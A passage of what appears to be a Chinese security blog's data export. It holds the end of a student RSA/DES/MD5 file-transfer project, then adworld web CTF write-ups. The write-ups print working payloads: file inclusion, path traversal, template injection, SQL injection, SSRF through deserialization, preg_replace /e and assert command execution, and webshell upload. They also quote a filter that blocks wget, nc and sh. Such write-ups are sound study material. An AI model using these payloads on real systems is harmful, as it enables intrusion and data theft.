alice发送身份明文信息client.recv(1024).decode()hash_name = md5(name)crpto_name = str(RSAEncode(hash_name, d, n)) # 发送对hash值加密后的值crpto_name = bytes(crpto_name,&#x27;utf-8&#x27;)client.send(crpto_name)print(client.recv(1024).decode()) # 接收身份认证的结果#接收bob身份hash并验证print(&quot;验证bob身份...&quot;,end=&quot;&quot;)a=input()bob_name = client.recv(512).decode() # bob发送过来的身份明文信息client.send(b&#x27;1&#x27;)hash_name = client.recv(512).decode() # bob使用自己的私钥加密身份明文信息hash值后的值plain_text = RSADecode(int(hash_name),e,n_bob) # 使用bob的公钥解密上一步的值client.send(b&#x27;1&#x27;)if plain_text == md5(bob_name): # 验证是不是bob print(bob_name) print(&quot;验证通过!&quot;)else: exit(&quot;验证错误!&quot;)while 1: a = input() bin_key = gen_key() # 随机生成64位的 DES加密明文使用的密钥 int_key = int(bin_key,2) # 将其转换为十进制数，便于后面使用RSA算法加密 print(&quot;随机产生对称密钥:&quot;,int_key) # 每次传输随机产生一个密钥更加安全 plain = read_file() # 读取文件内容 bin_cipher = DES_encode(plain, bin_key) # 使用DES算法加密内容 a = input() int_key = fast_mod(int_key,e,n_bob) # 加密DES的密钥 e是bob的公钥 print(&quot;加密对称密钥&quot;) print(&quot;传输密钥...&quot;) # 传输加密后DES密钥 client.sendall(bytes(str(int_key),&quot;utf-8&quot;)) client.recv(512) length = str(len(bin_cipher)) # 传输发送内容的长度 length = bytes(length,&quot;utf-8&quot;) # 方便其接收 client.send(length) print(&quot;传输密文...&quot;) client.sendall(bytes(str(bin_cipher),&quot;utf-8&quot;)) #发送密文 message = client.recv(512).decode() client.send(b&#x27;1&#x27;) crypt_message = client.recv(512).decode() hash_message = RSADecode(int(crypt_message),e,n_bob) if hash_message == md5(message): print(message) print(&quot;文件传输结束！&quot;) breakclient.close() Bob 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990# -*- coding = utf - 8 -*-#@Time : 2021/1/3 23:17#@Author : sunzy#@File : bob.pyimport socketimport libnumfrom RSA import *from DES import *from MD5 import *name = &quot;This is bob.&quot;n = 81836285346168841919828227774710209132464519960137459236348092425786962849543n_alice = 44531776921047477359676235110843825307036514195195627878765712056028758572817d = 39540198292360595989919600111176873707392294831248672388670326288876701993673e = 65537# e_alice = 2081server = socket.socket() #创建对象server.bind((&quot;localhost&quot;,8888))#绑定 ip和端口server.listen() #监听#等待连接print(&#x27;Waiting connection...&#x27;)#接受请求，返回套接字对象和IP+端口号con,addr = server.accept()con.send(bytes(&quot;Welcome connect!\\n开始加密传输:\\n&quot;,&quot;utf-8&quot;))con.recv(1024)# 验证alice身份print(&quot;验证alice身份...&quot;)a = input()alice_name = con.recv(512).decode() # alice 的明文信息con.send(b&#x27;1&#x27;)hash_name = con.recv(512).decode() # alice 用私钥加密明文的hash值plain_text = RSADecode(int(hash_name),e,n_alice) # 用alice 的公钥解密出hash值if plain_text == md5(alice_name): # 判断上一步的值与md5函数加密是否相同 print(alice_name) # 如果二者相同则可以保证对方是alice,这里的安全性是由公钥算法和hash函数保证 print(&quot;验证通过！&quot;) # 因为只有alice有自己的私钥，hash函数的存在防止伪造明文攻击 con.send(bytes(&quot;您通过了验证!&quot;,&quot;utf-8&quot;))else: exit(&quot;这不是alice,验证错误！&quot;)#送出自己的身份信息和签名值print(&quot;等待alice验证自身身份...&quot;)con.send(bytes(name,&#x27;utf-8&#x27;)) # 向alice发送身份信息的明文con.recv(1024).decode()hash_name = md5(name) # 明文信息的hash值crpto_name = str(RSAEncode(hash_name, d, n)) # 使用自己的私钥加密上一步的hash值crpto_name = bytes(crpto_name,&#x27;utf-8&#x27;) # 发送给alicecon.send(crpto_name)con.recv(1024)while 1: data = con.recv(1024) # 接收alice发送的使用公钥算法加密后的DES的密钥 data = data.decode() int_key = int(data) print(&quot;被加密后的密钥:&quot;,int_key) int_key = fast_mod(int_key, d, n) # 使用私钥d解密出DES密钥 print(&quot;解密后的密钥&quot;, int_key) print(&quot;----&quot;*10) # 接收密文的长度（为了方便存储） con.send(b&#x27;1&#x27;) length = con.recv(1024) length = int(length.decode()) buff = [] size = 0 while size &lt; length: # 开始接受密文 dat = con.recv(1024) size += len(dat.decode()) buff.append(dat) data = b&#x27;&#x27;.join(buff) bin_cipher = data.decode() cipher = bin_to_str(bin_cipher) bin_key = bin(int_key)[2:] # 将密钥转换成二进制数 print(&quot;解密传输内容:&quot;) print(libnum.b2s(DES_decode(cipher, bin_key))) #打印出解密后的明文 message = &quot;Bob received the file successfully!&quot; con.send(bytes(message,&#x27;utf-8&#x27;)) con.recv(1024).decode() hash_message = md5(message) crypt_message = str(RSAEncode(hash_message,d,n)) con.send(bytes(crypt_message,&#x27;utf-8&#x27;)) breakserver.close() file_decode 1234567891011121314151617181920212223242526272829303132333435363738# -*- coding = utf - 8 -*-#@Time : 2021/1/3 23:17#@Author : sunzy#@File : file_decode.pyimport randomimport socketimport refrom RSA import *from DES import *from MD5 import *def gen_key(): # 生成64位的对称加密的密钥 list = [] for i in range(64): c = random.choice([&#x27;0&#x27;, &#x27;1&#x27;]) list.append(c) res = &quot;&quot;.join(list) return resdef read_file(): try: f = open(&#x27;text.txt&#x27;,&#x27;r&#x27;, encoding = &#x27;utf-8&#x27;) text = f.read() f.close() print(&quot;读取成功!&quot;) return text except IOError: print(&quot;读取错误!&quot;)def bin_to_str(bin_str) : # 8位二进制转字符，用于bob收到密后使用 res = &quot;&quot; tmp = re.findall(r&#x27;.&#123;8&#125;&#x27;,bin_str) for i in tmp : res += chr(int(i,2)) return res","tags":[{"name":"古典密码","slug":"古典密码","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"name":"DES","slug":"DES","permalink":"https://sunzhengyu99.github.io/tags/DES/"},{"name":"RSA","slug":"RSA","permalink":"https://sunzhengyu99.github.io/tags/RSA/"},{"name":"MD5","slug":"MD5","permalink":"https://sunzhengyu99.github.io/tags/MD5/"}]},{"title":"adworld","date":"2020-11-30T02:45:48.000Z","path":"2020/11/30/adworld/","text":"为了完成网安作业必须多做点题，顺便写wp Web_php_include利用php伪协议上传一段php代码后执行，列出目录看到flag文件 再利用本地文件包含读取flag 1http://220.249.52.133:46457/?page=http://127.0.0.1/index.php/?hello=%3C?show_source(%22fl4gisisish3r3.php%22);?%3E warmup查看源码看到source.php，访问看到源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 源码中有一个hint.php，查看得到 1flag not here, and flag in ffffllllaaaagggg 访问 ffffllllaaaagggg，发现没有这个文件，所以可能是在根目录。 继续看代码有个白名单 1source.php,hint.php mb_substr函数会截取?前面的字符返回给page，检测其是否在白名单中 注意这里有一个urldecode()，所以提交前需要进行两次urlencode 解码后重复上面两步 1234$_page = mb_substr($_page,0,mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;));if (in_array($_page, $whitelist)) &#123; return true;&#125; 之后通过include函数获取flag 所以构造的payload中url解码后?前的内容必须是 source.php或者hint.php payload: 12GET:?page=hint.php%253F/../../../../../ffffllllaaaagggg 原理是hint.php?/被当作目录 ../是返回上一级目录，这里多几个../也没事，必须保证返回到根目录，而在根目录向上返回还是根目录。 所以上面的payload可以在根目录读取到flag。 NaNNaNNaNNaN-Batman下载附件打开后显示有乱码，但是可以看到&lt;script&gt;标签，于是改后缀伪html ,在浏览器打开，出现一个输入框。 继续看代码，看到函数的最后有个eval函数，中间的参数为eval(_)，正好与开头定义的名相同&lt;script&gt;_=&#39;function，所以想办法把原函数显示处理 将eval改为alert，保存后在浏览器中打开看到弹框中出现源码。 在线格式化后的结果 12345678910111213141516function $() &#123; var e = document.getElementById(&quot;c&quot;).value; if (e.length == 16) if (e.match(/^be0f23/) != null) if (e.match(/233ac/) != null) if (e.match(/e98aa$/) != null) if (e.match(/c7be9/) != null) &#123; var t = [&quot;fl&quot;, &quot;s_a&quot;, &quot;i&quot;, &quot;e&#125;&quot;]; var n = [&quot;a&quot;, &quot;_h0l&quot;, &quot;n&quot;]; var r = [&quot;g&#123;&quot;, &quot;e&quot;, &quot;_0&quot;]; var i = [&quot;it&#x27;&quot;, &quot;_&quot;, &quot;n&quot;]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) &#123; document.write(s[o % 4][0]); s[o % 4].splice(0, 1) &#125; &#125;&#125;document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;);delete _ 再看这段js代码中的if语句 1if (e.length == 16) if (e.match(/^be0f23/) != null) if (e.match(/233ac/) != null) if (e.match(/e98aa$/) != null) if (e.match(/c7be9/) != null) 参数e的长度为16，其中要包含 1be0f23开头 233ac e98aa结尾 c7be9 通过if语句后会通过一个算法将flag算出来 ok,那就按if语句的要求写出e 1be0f233ac7be98aa 还可以直接利用 123456789var t = [&quot;fl&quot;, &quot;s_a&quot;, &quot;i&quot;, &quot;e&#125;&quot;]; var n = [&quot;a&quot;, &quot;_h0l&quot;, &quot;n&quot;]; var r = [&quot;g&#123;&quot;, &quot;e&quot;, &quot;_0&quot;]; var i = [&quot;it&#x27;&quot;, &quot;_&quot;, &quot;n&quot;]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) &#123; document.write(s[o % 4][0]); s[o % 4].splice(0, 1) &#125; 在浏览器的console中运行 web212345678910111213141516171819202122&lt;?php$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;function encode($str)&#123; $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; &#125; return str_rot13(strrev(base64_encode($_)));&#125;highlight_file(__FILE__);/* 逆向加密算法，解密$miwen就是flag*/?&gt; 了解几个函数的用法 str_rot13() 函数对字符串执行 ROT13 编码。 ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。 提示：编码和解码都是由相同的函数完成的。如果您把已编码的字符串作为参数，那么将返回原始字符串。 strrev() 函数反转字符串。 解密脚本 123456789101112131415&lt;?php$str = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;function decode($str)&#123; $s = base64_decode(strrev(str_rot13($str))); //echo($s); for($_0=0;$_0&lt;strlen($s);$_0++)&#123; $_c=substr($s,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c; &#125; echo strrev($_);&#125;decode($str);?&gt; PHP2这题应该给个提示的，访问index.phps获取源码。 phps，用御剑和dirsearch都扫不出来，所以必须知道才可能做出来。 给新生赛出题的想法来源，当时做这题的时候费了好大劲才找到index.phps，所以也让让萌新们体验一下找不到的绝望🤣 123456789101112131415&lt;?phpif(&quot;admin&quot;===$_GET[id]) &#123; echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;admin&quot;)&#123; echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;&#125;?&gt;Can you anthenticate to this website? 获取id后urldecode之后再赋值给id，要注意上传的参数浏览器会字段一次urldecode，所以这里的admin需要两次urlencode payload： 12345admin%61%64%6D%69%6E%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45GET:?id=%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45 unserialize3很简单的unserialize 利用漏洞，当属性值大于真是属性值的时候会跳过wakeup函数，php版本小于5.6 1234567891011&lt;?phpclass xctf&#123;public $flag = &#x27;111&#x27;;// public function __wakeup()&#123;// exit(&#x27;bad requests&#x27;);// &#125;&#125;$c = new xctf();echo(serialize($c));?&gt; 1234O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;GET:?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125; upload1抓包修改MIME为image/jpeg,即可上传成功，之后蚁剑连接拿到flag。 Web_python_template_injection模板注入，和cumtctf华为杯很像，但是没那个难。 首先判断是否存在模板注入，在url后输入 49，显示页面如下，可以确定存在模板注入，因为我们输入的值被其当作变量带入计算。 模板注入原理这篇博客写的很详细：https://xz.aliyun.com/t/3679 几个常用的魔术方法 _class_ 返回类型所属的对象 _mro_ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 _base_ 返回该对象所继承的基类 // base和mro都是用来寻找基类的 _subclasses_ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 _init_ 类的初始化方法 _globals_ 对包含函数全局变量的字典的引 直接开始这题 1.查看所有模块，其中第41个模块file和72个模块，包含文件读取的相关操作，可以利用 1&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125; 2.列出文件目录 1&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125; 3.读取flag 1&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read() easytornado这又是web服务器和web应用框架，会不会和flask框架一样存在模板模板注入 0x1 原理tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过两个大括号进行传递变量和执行简单的表达式。 0x2 解题1.先看看题目给的连接 1http://220.249.52.133:43538/file?filename=/welcome.txt&amp;filehash=34b3f8fdcf2ec4394a5b9b20580c0096 提交的参数是文件名和文件的hash值 并且给了三web页面 123/flag.txt/welcome.txt/hints.txt flag.txt 1flag in /fllllllllllllag hints.txt给的提示 12/hints.txtmd5(cookie_secret+md5(filename)) 这就知道了filehash的来源了 2.读取flag.txt就必须构造payload： 1//?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/fllllllllllllag)) 但是我们不知道cookie_secret 的值，先提交试试 出现了这个错误页面，并且我们可以控制msg的值，存在模板注入 3.输入msg=&#123;&#123;handler.settings&#125;&#125;,获取当前的环境变量，得到cookie_sercet的值 12345&lt;?php$filename = md5(&#x27;/fllllllllllllag&#x27;);$s = &#x27;cb82b218-07e3-491d-a302-532dbae27e6a&#x27;;echo md5($s.$filename);?&gt; 于是构造出payload 12?filename=/fllllllllllllag&amp;filehash=0caf8cf587a036fabea3fa65f058c275 拿到flag 参考: https://www.cnblogs.com/cimuhuashuimu/p/11544455.html shrine123456789101112131415161718192021222324import flaskimport osapp = flask.Flask(__name__)app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)@app.route(&#x27;/&#x27;)def index(): return open(__file__).read()@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)def shrine(shrine): def safe_jinja(s): s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == &#x27;__main__&#x27;: app.run(debug=True) 0x1考察点很明显的flask框架 存在模板注入，但是对()进行了过滤，并将config , self 加入了黑名单，Web_python_template_injection这题的payload就没法用了。 0x2构造payload可以使用内置函数get_flashed_messages()，又因为config在current_app里面，所以我们可以构造payload 1&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125; mfw看到了git，可能存在git源码泄露 访问http://220.249.52.133:44852/.git/，确定存在源码泄露，使用githack下载源码，目录结构如图，templates下存在flag.php,它就是我们的目标。 代码审计12345678910111213141516&lt;?phpif (isset($_GET[&#x27;page&#x27;])) &#123; $page = $_GET[&#x27;page&#x27;];&#125; else &#123; $page = &quot;home&quot;;&#125;$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &#x27;..&#x27; is dangerous!assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);?&gt; file_exists函数 fil 输入 1?page=flag 页面显示为空，因为file_exists只能判断文件是否存在，无法返回文件内容，这就用利用cat读取内容了。因为没有对page做其他的过滤，我们可以利用assert + system，达到命令注入的目的。 注意：assert函数会将传入的参数当作php代码执行 构造payload，这里就像sql注入的语句，闭合前面的语句并填写自己想要的语句 12345678910先测试一下想法对不对//?page=&#x27;) or phpinfo();#//assert(&quot;file_exists(&#x27;$file&#x27;) or phpinfo();)#?page=&#x27;)%20or%20phpinfo()%3B%23显示出了phpinfo(),所以思路是对的继续构造//?page=&#x27;) or system(&quot;cat templates/flag.php&quot;); #最后的payload?page=&#x27;)%20or%20system(%22cat%20templates%2Fflag.php%22)%3B%23 fakebook0x1 sql注入进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方 http://220.249.52.133:44224/view.php?no=1参数no这里应该是一个数字型的注入点，测试一下。 http://220.249.52.133:44224/view.php?no=1 and 1=1显示是正常的，但是 http://220.249.52.133:44224/view.php?no=1 and 1=2网页报错，确定了就是数字型注入 接下来继续注入的常规操作。 http://220.249.52.133:44224/view.php?no=-2 order by 4#时页面显示正常，并提示了网站的根目录 但是当 order by 5 # 时，网页报错，确定是四列。 爆表名 本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测 试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示 123Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31提示存在反序列化，但是不知道怎么用继续爆表。 12345?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;#//**no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS** 爆出一大堆列名。直接读取data的内容 1?no=-2 union/**/select 1,(select data from users),3,4 # 发现内容是注册时信息保存为序列化内容 1O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;sunzy&quot;;s:3:&quot;age&quot;;i:22;s:4:&quot;blog&quot;;s:12:&quot;22.github.io&quot;;&#125; 到这里就不知道怎么办了。。。 做到这里我们大致知道了下面的信息： view.php进行了对某个数据进行反序列化(unserializa)操作，从上面跑出的data分析是对data进行了 反序列化操作,在上一步骤中我们得到了user表有4列分别为no，passwd，data，username，并没有 单独存放blog列，所以blog显示应该是从data列取出再进行反序列化 0x02代码审计扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径 源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass UserInfo //user信息类&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;;public function __construct($name, $age, $blog)&#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog;&#125;function get($url) // 处理url&#123; $ch = curl_init(); //初始化一个curl会话 curl_setopt($ch, CURLOPT_URL, $url); //设置url和相应的参数 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); // 执行这个cURL会话 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); //获取状态码 if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output;&#125;public function getBlogContents ()&#123; return $this-&gt;get($this-&gt;blog);&#125;public function isValidBlog () //这是注册账号时检测blog是否合法&#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog);&#125;&#125; 审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。 12get($url) get($this-&gt;blog) 这里get中的参数取自blog，所以我们可以利用反序列化构造出一个ssrf，将blog位置修改为我们想要访问的位置，结合上面的提示就构造出下面的payload： 1?no=-2%20union/**/select%201,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;sunzy&quot;;s:3:&quot;age&quot;;i:22;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;%20# 查看源码，解base64。 思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。 ics-05进入页面只有一个是有用的，进入设备维护中心 先点击云平台设备维护中心，url会发生改变出现page参数，这一看就是典型的读取源码 构造payload: 1?page=php://filter/convert.base64-encode/resource=index.php 源码中的php代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=&quot;text-align:center&quot;&gt; &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=&quot;text-align:center&quot;&gt; &lt;p class=&quot;lead&quot;&gt; &lt;?php if (strpos($page, &#x27;input&#x27;) &gt; 0) &#123; //这里是对几个关键词的过滤，我们读取源码时没有用到这几个关键词所以没有影响 die(); &#125; if (strpos($page, &#x27;ta:text&#x27;) &gt; 0) &#123; die(); &#125; if (strpos($page, &#x27;text&#x27;) &gt; 0) &#123; die(); &#125; if ($page === &#x27;index.php&#x27;) &#123; die(&#x27;Ok&#x27;); &#125; include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123; //xxf头 echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern = $_GET[pat]; //get 提交三个参数 $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 前面代码没有突破点，直到看到preg_replace 漏洞 $pattern 存在 /e 模式修正符，允许代码执行 /e 模式修正符，是 *preg_replace() * 导致 $replacement 部分当做php代码来执行。 所以可以构造如下 payload 1234?pat=/test/e&amp;rep=system(&#x27;ls&#x27;)&amp;sub=test?pat=/test/e&amp;rep=system(&#x27;ls s3chahahaDir/&#x27;)&amp;sub=test?pat=/test/e&amp;rep=system(&#x27;ls s3chahahaDir/flag&#x27;)&amp;sub=test?pat=/test/e&amp;rep=system(&#x27;cat s3chahahaDir/flag/flag.php&#x27;)&amp;sub=test 参考:https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html lottery0x1注册玩一下​ 进入页面发下是一个买彩票的，先注册一个账号，初始有20块钱，要买flag，需要99999999，显然不可能 还有一个买彩票的地方，每次花2块钱两个号码对了奖励五块，这些都不重要。 开始是想着通过脚本多买几次，后来发现不对啊，每次都是买完了之后中将号码才公布出来，脚本就没意义了，所以这个想法断了。 于是去看看了别的 0x2 git源码泄露​ 下载了好几个文件，看看了其中有用的只有api.php，代码太长了，复制了重要的部分 审计代码 1234567891011121314151617181920212223242526272829//随机生成中将号码function random_win_nums()&#123; $result = &#x27;&#x27;; for($i=0; $i&lt;7; $i++)&#123; $result .= random_num(); //利用自定义的随机函数生成随机数 &#125; return $result;&#125;//检测是否中奖以及 奖励和扣费规则function buy($req)&#123; require_registered(); //检测是否注册 require_min_money(2); //是否有2块钱买彩票 $money = $_SESSION[&#x27;money&#x27;]; //用户的钱 $numbers = $req[&#x27;numbers&#x27;]; //用户买的彩票号码 $win_numbers = random_win_nums(); //中奖号码 $same_count = 0; //记录有几位中奖 for($i=0; $i&lt;7; $i++)&#123; // 判断有几位中奖 if($numbers[$i] == $win_numbers[$i])&#123; //重点来了 $same_count++; &#125; &#125; switch ($same_count) &#123; //pass &#125; $money += $prize - 2; $_SESSION[&#x27;money&#x27;] = $money; response([&#x27;status&#x27;=&gt;&#x27;ok&#x27;,&#x27;numbers&#x27;=&gt;$numbers, &#x27;win_numbers&#x27;=&gt;$win_numbers, &#x27;money&#x27;=&gt;$money, &#x27;prize&#x27;=&gt;$prize]);&#125; 上面的代码看着像是没什么问题，但是对==敏感的一眼就会发现这里存在问题 12345for($i=0; $i&lt;7; $i++)&#123; // 判断有几位中奖 if($numbers[$i] == $win_numbers[$i])&#123; //重点来了 $same_count++; &#125; &#125; 这里判断是否相等居然用 ==，就很离谱，也是突破点，测试效果如下 所以思路就是，抓包修改我们输入的号码都为True，就行了，一次中奖不够就多买几次 注意这里上传数据时使用的是json格式，json数组类型 之后返回浏览器买flag即可 favorite_number1234567891011121314151617&lt;?php//php5.5.9$stuff = $_POST[&quot;stuff&quot;];$array = [&#x27;admin&#x27;, &#x27;user&#x27;];if($stuff === $array &amp;&amp; $stuff[0] != &#x27;admin&#x27;) &#123; $num= $_POST[&quot;num&quot;]; if (preg_match(&quot;/^\\d+$/im&quot;,$num))&#123; if (!preg_match(&quot;/sh|wget|nc|python|php|perl|\\?|flag|&#125;|cat|echo|\\*|\\^|\\]|\\\\\\\\|&#x27;|\\&quot;|\\|/i&quot;,$num))&#123; echo &quot;my favorite num is:&quot;; system(&quot;echo &quot;.$num); &#125;else&#123; echo &#x27;Bonjour!&#x27;; &#125; &#125;&#125; else &#123; highlight_file(__FILE__);&#125; 0x1代码审计代码意思 输入一个数组stuff,stuff要和array相同，但是$stuff[0] != ‘admin’ 这是一个矛盾的判断，所以要想办法绕过 下面是提交一个数字，通过判断后打印出这个数字并执行system函数 这里一定存在命令执行 题目直接给了源码，并且表明了php版本为5.5.9，那就说明这个题目一定和这个版本的漏洞有关，google一下 https://segmentfault.com/q/1010000003871264，这是与这题很像的一题 php5.5.9的数组的key溢出漏洞 结合上面的题目构造出payload: 1stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123 页面成功打印出了my favorite num is:123,说明前面已经绕过成功了 0x2 绕过数字，命令注入因为正则表达式最后的m允许多行匹配，所以这里可以使用%0a绕过数字检测 开始构造出的 1stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123%0als / 成功列出了目录，看到了flag，但是读取的时候发现flag关键被过滤了 所以不得不换一种方法 12345678ls -i# 列出当前⽂件列表，取出inode# find找到对应inode的⽂件find / -inum# more读取对应的文件more `find / -inum ` 所以最后的payload: 1stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=111%0amore `find / -inum 38667190` 参考： https://www.coodesker.com/ https://blog.csdn.net/weixin_44604541/article/details/109365511 bug0x1获得admin权限先注册登录看看，页面功能很简单，当点击manage时，提示需要admin账号才可以，所以接下来就要想办法拿到admin账号 在注册的时候有一个找回密码的功能，当我们点进去的时候可以看到，修改密码只需要生日和地址 这就想到了刚才登录页面显示的个人信息，那么怎么才能拿到admin的个人信息就是一个问题 不妨先抓包看一下，可以看到cookie中有一个user，这个值像是md5，在线解密一下 1282ed7a14920dd2db1b6657348656eaa57:123 也就是uid+username的md5值，那我们是不是可以伪造一个这样的cookie然后到个人信息的页面提交获取信息 1md5(1:amdin)=4b9987ccafacb8d8fc08d22bbca797ba 这样就获取了信息，再去修改密码登录 0x2上传绕过登录后点击manage提示非法IP，直接抓包添加xxf，得到提示 1&lt;!-- index.php?module=filemanage&amp;do=???--&gt; 访问一下上面的地址一开始以为do是submit，但是提交没反应，又改成了upload，这样就对了，出来一个上传图片的网页 上传php文件，出现前端检测提示 那就直接抓包，把php改成php5修改了MIME为image/jpeg，但是还是提示可以看出来是一个php文件，可能检测了文件开头信息，那就改成下面格式的一句话木马 获得了flag 